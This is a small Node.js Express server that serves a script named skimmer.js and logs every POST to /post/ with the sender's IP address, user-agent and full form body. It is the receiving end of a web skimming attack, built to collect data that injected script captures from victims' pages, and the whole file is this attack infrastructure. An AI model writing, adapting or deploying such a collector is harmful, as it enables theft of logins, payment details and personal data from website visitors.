var express = require('express');
var bodyParser = require('body-parser');
var app = express();

app.use(bodyParser.urlencoded({ extended: false }));

app.post('/post/', function(req, res) {
   var sn = JSON.stringify(req.body);
   console.log( req.connection.remoteAddress + " " + req.headers['user-agent'] +  " " + sn );
   res.send("OK");
});

app.get('/', function(req, res) {
  res.sendFile('index.html', { root: __dirname });
  //console.log("GET request to / from  " + req.connection.remoteAddress);
});

app.get('/skimmer.js', function(req, res) {
  res.sendFile('skimmer.js', { root: __dirname });
  //console.log("GET request to /payload.js from " + req.connection.remoteAddress);
});

app.listen(7002);
